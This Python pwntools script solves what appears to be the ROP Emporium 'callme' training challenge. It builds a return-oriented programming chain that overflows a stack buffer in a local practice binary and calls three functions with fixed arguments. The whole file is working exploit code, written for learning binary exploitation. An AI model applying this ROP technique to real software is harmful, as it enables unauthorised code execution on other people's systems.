#!/usr/bin/env python3
from pwn import *

usefulFunction = p64(0x00000000004008f2)
callme_one_plt = p64(0x0000000000400720)
callme_two_plt = p64(0x0000000000400740)  
callme_three_plt = p64(0x00000000004006f0)
pop_args_ret = p64(0x000000000040093c)
dead_beef = p64(0xdeadbeefdeadbeef)
cafe_babe = p64(0xcafebabecafebabe)
dude_food = p64(0xd00df00dd00df00d)
ret = p64(0x00000000004006be)

pop_args = pop_args_ret + dead_beef + cafe_babe + dude_food
callone =  pop_args + callme_one_plt
calltwo = ret + pop_args + callme_two_plt
callthree = ret + pop_args + callme_three_plt

nop = b"\x90"
payload = (nop * 40) + callone + calltwo + callthree

p = process("./callme")
context.update(arch="amd64", os="linux")

p.send(payload)
print(p.recvall())
